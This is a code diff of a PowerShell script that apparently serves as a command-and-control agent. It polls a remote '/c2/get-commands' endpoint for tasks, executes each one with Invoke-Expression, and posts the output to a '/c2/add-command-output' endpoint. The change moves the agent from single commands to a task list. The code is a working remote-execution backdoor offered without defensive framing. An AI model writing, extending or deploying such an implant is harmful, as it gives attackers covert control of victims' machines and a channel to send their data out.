@@ -35,50 +35,58 @@ $connection_id = $response.connection_id.ToString()
 Write-Host "Registered connection with ID: $connection_id"
 
 # while loop to check periodically for commands
+# while loop to check periodically for commands
 while ($true) {
     $url = "$main_url/c2/get-commands/$connection_id"
-    $command = Invoke-RestMethod -Method Get -Uri $url
+    Write-Host "Checking for commands at $url"
+    $tasks = Invoke-RestMethod -Method Get -Uri $url
 
-    Write-Host "Received command: $command"
+    # Process each task
+    foreach ($task in $tasks.task_list) {
+        Write-Host "Received command: $($task.command)"
 
-    # check if the command is empty (also check for empty list/array)
-    if ([string]::IsNullOrEmpty($command)) {
-        write-host "No command received yet..."
-        # manufacture the start-sleep cmdlet
-        $startSleepCmd = "Start-Sleep -$intervalUnit $interval"
-        $startSleepCmdStr = [String]$startSleepCmd
-        Invoke-Expression $startSleepCmdStr
-        continue
+        # if the command is "exit", break out of the loop
+        if ($task.command -eq "exit") {
+            write-host "Exiting..."
+            break
+        }
+
+        # execute the command and send the response back to the server
+        write-host "Executing command: $($task.command)"
+
+        # Check if the command is an array
+        if ($task.command -is [array]) {
+            # Execute each command in the array
+            foreach ($command in $task.command) {
+                # Execute the command using Invoke-Expression
+                $result = Invoke-Expression $command
+
+                # Capture the output of the command as a string
+                $output = $result | Out-String
+
+                $body = @{
+                    output = $output
+                } | ConvertTo-Json
+            
+                $url = "$main_url/c2/add-command-output/$connection_id/$($task._id)"
+                Invoke-RestMethod -Method Post -Uri $url -Body $body -ContentType "application/json"
+            }
+        } else {
+            # Execute the command using Invoke-Expression
+            $result = Invoke-Expression $task.command
+
+            # Capture the output of the command as a string
+            $output = $result | Out-String
+
+            $body = @{
+                output = $output
+            } | ConvertTo-Json
+        
+            $url = "$main_url/c2/add-command-output/$connection_id/$($task._id)"
+            Invoke-RestMethod -Method Post -Uri $url -Body $body -ContentType "application/json"
+        }
     }
 
-    # if the command is "exit", break out of the loop
-    if ($command -eq "exit") {
-        write-host "Exiting..."
-        break
-    }
-
-    # execute the command and send the response back to the server
-    write-host "Executing command: $command"
-
-    # check if the command is not empty before executing it
-    if ($command -ne '' -or $null -ne $command) {
-        # convert the command to a string and execute it
-        $commandStr = [String]$command
-
-        # Execute the command using Invoke-Expression
-        $result = Invoke-Expression $commandStr
-
-        # Capture the output of the command as a string
-        $output = $result | Out-String
-
-        $body = @{
-            output = $output
-        } | ConvertTo-Json
-    
-        $url = "$main_url/c2/add-command-output/$connection_id"
-        $body = @{
-            output = $output
-        } | ConvertTo-Json
-        Invoke-RestMethod -Method Post -Uri $url -Body $body
-    }
+    # Sleep for the specified interval
+    Start-Sleep -Seconds $interval
 }
